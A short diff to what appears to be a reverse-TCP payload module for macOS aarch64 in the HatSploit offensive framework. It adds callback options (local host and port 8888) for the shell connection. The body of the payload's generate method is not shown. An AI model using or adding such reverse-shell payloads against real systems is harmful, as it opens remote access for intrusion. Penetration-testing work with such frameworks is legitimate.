@@ -26,7 +26,11 @@
 
 from core.lib.payload import HatSploitPayload
 
+from utils.tcp.tcp import tcp
+
 class HatSploitPayload(HatSploitPayload):
+    tcp = tcp()
+
     details = {
         'Name': "macOS aarch64 Membrane Reverse TCP",
         'Payload': "macos/aarch64/membrane_reverse_tcp",
@@ -34,6 +38,21 @@ class HatSploitPayload(HatSploitPayload):
             'enty8080'
         ],
         'Description': "Membrane Reverse TCP Payload for macOS aarch64."
+    }
+
+    options = {
+        'LHOST': {
+            'Description': "Local host.",
+            'Value': tcp.get_local_host(),
+            'Type': "ip",
+            'Required': True
+        },
+        'LPORT': {
+            'Description': "Local port.",
+            'Value': 8888,
+            'Type': "port",
+            'Required': True
+        }
     }
 
     def generate(self):
